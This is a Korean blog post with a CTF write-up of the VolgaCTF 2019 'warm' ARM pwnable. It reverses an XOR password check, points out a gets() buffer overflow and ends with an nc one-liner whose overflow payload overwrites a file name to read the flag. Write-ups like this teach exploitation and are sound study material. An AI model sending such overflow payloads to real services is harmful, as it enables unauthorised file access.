---
layout: post
title: ! "[Volga ctf] warm write up"
excerpt_separator: <!--more-->
comments : true
tags:
  - volga
  - warm
  - pwnable
  - chaem
---

ctf가 끝난지 한참 뒤에 쓰는 volga ctf 2019 qual의 warm이라는 pwnable문제이다.  

<!--more-->

일단 `file` 명령어로 보니, ARM 바이너리라는 것을 알 수 있었다.  

```
root@ubuntu:/home/ubuntu/study/ctf/warm# file warm 
warm: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=c549628c0b3841a5fd9a23f0faaf6b51eb858e94, stripped
```

IDA의 hexray기능을 이용을 이용하여 코드를 보니, 이렇게 이쁘게 다 보여주었당...  
다른 writeup을 보다가 `Ghildra(기드라)`라는 툴도 알게되었다. IDA랑은 다르게 오픈소스로 제공되다니, 짱짱 *.* 다음에 꼭 한번 써봐야겠당 ㅎㅎ  
아무튼 본론으로 돌아와서, 단순한 연산을 통해 문자열을 검사하는 것을 알 수 있다.  

```c
signed int __fastcall sub_788(const char *a1)
{
  char *s; // [sp+4h] [bp+4h]

  s = (char *)a1;
  if ( strlen(a1) <= 0xF )
    return 1;
  if ( (unsigned __int8)(*s ^ 0x23) != 0x55
    || (unsigned __int8)(s[1] ^ *s) != 0x4E
    || (unsigned __int8)(s[2] ^ s[1]) != 0x1E
    || (unsigned __int8)(s[3] ^ s[2]) != 0x15
    || (unsigned __int8)(s[4] ^ s[3]) != 0x5E
    || (unsigned __int8)(s[5] ^ s[4]) != 0x1C
    || (unsigned __int8)(s[6] ^ s[5]) != 0x21
    || (unsigned __int8)(s[7] ^ s[6]) != 1
    || (unsigned __int8)(s[8] ^ s[7]) != 0x34
    || (unsigned __int8)(s[9] ^ s[8]) != 7
    || (unsigned __int8)(s[10] ^ s[9]) != 0x35
    || (unsigned __int8)(s[11] ^ s[10]) != 0x11
    || (unsigned __int8)(s[12] ^ s[11]) != 0x37
    || (unsigned __int8)(s[13] ^ s[12]) != 0x3C
    || (unsigned __int8)(s[14] ^ s[13]) != 0x72
    || (unsigned __int8)(s[15] ^ s[14]) != 0x47 )
  {
    return 2;
  }
  return 0;
}
```
이걸 다시 역연산 해보면!  
```python
input =[0x76,0x4e, 0x1e, 0x15, 0x5e, 0x1c, 0x21, 1, 0x34, 7, 0x35, 0x11, 0x37, 0x3c, 0x72, 0x47]
pw = chr(input[0])
result = input[0]
for i in range(1,len(input)):
    val = result ^ input[i]
    pw=pw+chr(val)
    result = val

print(pw)
```
이런 문자열이 나오는 것을 알 수 있다!  
```
root@ubuntu:/home/ubuntu/study/ctf/warm# python test.py 
v8&3mqPQebWFqM?x
```
지금은 서버가 닫혀있지만, 위의 값을 입력하면 `Seek file with something more sacred!`라는 문구를 출력해준다. 여기서 `scared`가 힌트가 된다.  

```
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?x
Seek file with something more sacred!
```

우선 다음 함수를 보면, gets()함수를 사용함으로써, overflow가 발생하는 것을 알 수 있다.  

```c
int sub_9EC()
{
  _IO_FILE *fp; // [sp+Ch] [bp+Ch]
  int c; // [sp+10h] [bp+10h]
  int v3; // [sp+14h] [bp+14h]
  int v4; // [sp+78h] [bp+78h]

  setvbuf((FILE *)stdout, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_8F0((char *)&v4);
      puts("Hi there! I've been waiting for your password!");
      gets((char *)&v3);
      if ( !sub_788((const char *)&v3) )
        break;
      sub_978(1, 0);
    }
    fp = (_IO_FILE *)fopen((const char *)&v4, "rb");
    if ( fp )
      break;
    sub_978(2, &v4);
  }
  while ( 1 )
  {
    c = IO_getc(fp);
    if ( c == -1 )
      break;
    putchar(c);
  }
  fclose((FILE *)fp);
  return 0;
}
```

buffer는 100 bytes로, `v8&3mqPQebWFqM?x` 16 bytes를 포함하여 overflow 시켜준다.  

```c
char *__fastcall sub_8F0(char *a1)
{
  char *result; // r0
  char *dest; // [sp+4h] [bp+4h]
  const char *src; // [sp+Ch] [bp+Ch]
  int v4; // [sp+10h] [bp+10h]
  char v5; // [sp+14h] [bp+14h]
  int v6; // [sp+18h] [bp+18h]

  dest = a1;
  strcpy(&v6, "FLAG_FILE");
  src = getenv((const char *)&v6);
  v4 = *(_DWORD *)"flag";
  v5 = aFlag[4];
  if ( src )
    result = strcpy(dest, src);
  else
    result = strcpy(dest, (const char *)&v4);
  return result;
}
```

그리고 마지막에 파일 이름을 써주면 flag를 얻을 수 있게 된다.  

```
python -c "print('v8&3mqPQebWFqM?x'+'A'*84+'sacred');" | nc warm.q.2019.volgactf.ru 443 
```
